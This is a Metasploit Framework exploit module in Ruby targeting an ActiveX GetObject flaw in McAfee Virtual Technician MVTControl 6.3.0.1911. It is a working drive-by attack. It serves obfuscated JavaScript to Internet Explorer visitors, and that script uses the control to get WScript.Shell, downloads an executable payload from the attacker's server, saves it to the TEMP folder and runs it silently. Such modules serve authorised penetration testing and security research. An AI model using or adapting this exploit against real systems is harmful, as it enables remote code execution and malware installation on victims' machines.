##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "McAfee Virtual Technician MVTControl 6.3.0.1911 GetObject Vulnerability",
			'Description'    => %q{
					This modules exploits a vulnerability found in McAfee Virtual Technician's
				MVTControl.  This ActiveX control can be abused by using the GetObject() function
				to load additional unsafe classes such as WScript.Shell, therefore allowing remote
				code execution under the context of the user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'rgod',   #Initial discovery, Poc
					'sinn3r'  #Metasploit
				],
			'References'     =>
				[
					[ 'EDB', '18805' ]
				],
			'Payload'        =>
				{
					'BadChars'        => "\x00",
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'         => "none",
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Apr 30 2012",
			'DefaultTarget'  => 0))
	end

	def exploit
		@payload_name = rand_text_alpha(rand(6) + 5) + ".exe"
		super
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']

		if agent !~ /MSIE \d/
			print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		if request.uri =~ /\.exe$/
			return if ((p=regenerate_payload(cli))==nil)
			data = generate_payload_exe({:code=>p.encoded})
			print_status("Sending payload")
			send_response(cli, data, {'Content-Type'=>'application/octet-stream'})
			return
		end

		# <object classid='clsid:2EBE1406-BE0E-44E6-AE10-247A0C5AEDCF' id='obj'></object>
		js = <<-JS
		var obj = new ActiveXObject("MVT.MVTControl.6300");

		var ws  = obj.GetObject("WScript.Shell");
		var ado = obj.GetObject("ADODB.Stream");
		var e   = ws.Environment("Process");
		var url = document.location + "/#{@payload_name}";
		var tmp = e.Item("TEMP") + "\\\\#{@payload_name}";

		var xml = new ActiveXObject("Microsoft.XMLHTTP");
		xml.open("GET", url, false);
		xml.send(null);
		res = xml.responseBody;

		ado.Type = 1;
		ado.Mode = 3;
		ado.Open();
		ado.Write(res);
		ado.SaveToFile(tmp);
		ws.Run(tmp, 0);
		JS

		js = ::Rex::Exploitation::JSObfu.new(js)
		js.obfuscate

		html = <<-EOS
		<html>
		<head>
		</head>
		<body>
		<script defer=defer>
		#{js}
		</script>
		</body>
		</html>
		EOS

		print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end